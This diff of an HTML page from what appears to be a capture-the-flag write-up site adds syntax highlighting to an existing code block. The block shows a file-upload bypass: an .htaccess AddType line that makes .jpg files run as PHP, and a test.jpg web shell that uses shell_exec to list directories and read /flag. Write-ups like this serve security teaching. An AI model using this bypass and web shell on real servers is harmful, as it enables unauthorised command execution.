@@ -5,6 +5,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 	<title>RiceSec</title>
 
+	<link href="/writeups/css/prism-one-light.css" rel="stylesheet" />
 	<link rel="stylesheet" href="/writeups/css/style.css" />
 </head>
 
@@ -23,12 +24,7 @@
 <pre><code>AddType application/x-httpd-php .jpg
 </code></pre>
 <p><code>test.jpg</code>:</p>
-<pre><code class="language-php">&lt;?php
-  echo shell_exec(&quot;ls -la ..&quot;);
-  echo shell_exec(&quot;ls -la /&quot;);
-  echo shell_exec(&quot;cat /flag&quot;);
-?&gt;
-</code></pre>
+<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><br>  <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls -la .."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>  <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls -la /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>  <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br><span class="token delimiter important">?></span></span></code></pre>
 
 
 
